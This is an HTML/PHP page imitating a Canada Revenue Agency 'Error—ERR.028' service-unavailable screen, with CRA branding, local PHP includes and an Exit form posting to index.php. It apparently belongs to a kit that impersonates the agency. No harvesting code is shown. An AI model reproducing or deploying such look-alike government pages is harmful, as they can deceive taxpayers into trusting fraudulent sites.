<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
   <body>
      </header>
      <?php include ("files/head.php"); ?>
      <div id="brand-container-cra">
         <div class="container">
            <div class="row">
               <div class="col-xs-12 col-sm-10" id="brand-text-cra">
                  Canada Revenue Agency
               </div>
               <div class="col-xs-4 col-sm-2 text-right">
               </div>
            </div>
         </div>
      </div>
      <main property="mainContentOfPage" class="container">
         <div class="left"></div>
         <div class="center">
            <div id="content">
               <script>
                  document.title = "Canada Revenue Agency - Error  [ERR.028]";
               </script>
               <div id="errorTitle">
                  <h1 id="wb-cont">
                     Error—ERR.028
                  </h1>
               </div>
               <div id="errorBody">
                  <p>Our services are not available at this time.</p>
                  <p>See our <a href="http://www.cra-arc.gc.ca/esrvc-srvce/tx/psssrvcs/hrs-eng.html">Hours of service.</a></p>
               </div>
               
               <div class="clear"></div>
            </div>
         </div>
         <div class="formButtons">
            <form action="index.php" method="post">
               <input type="submit" class="btn btn-default" value="Exit">
            </form>
         </div>
         <p></p>
         <div class="hidden-print">
            <dl id="wb-dtmd" property="dateModified">
               <dt>Date modified: </dt>
               <dd><time>2024-02-05</time></dd>
            </dl>
         </div>
      </main>
      <?php include ("files/footer.php"); ?>
